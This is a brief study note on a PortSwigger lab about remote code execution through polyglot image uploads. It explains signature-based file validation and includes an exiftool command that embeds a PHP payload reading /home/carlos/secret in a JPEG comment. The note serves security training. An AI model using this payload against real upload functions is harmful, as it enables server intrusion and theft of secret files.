# Remote code execution via polyglot web shell upload

[Lab in PortSwigger](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

## Definition
Instead of implicitly trusting the Content-Type specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes FF D8 FF.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata. 

## Notes
Use `exiftool` to craft the polyglot file as shown below:
```bash
exiftool -Comment="<?php echo ' START '.file_get_contents('/home/carlos/secret').' END '; ?>" avatar.jpg -o avatar.php
```

## Key Words
> exiftool, file upload, web shell, rce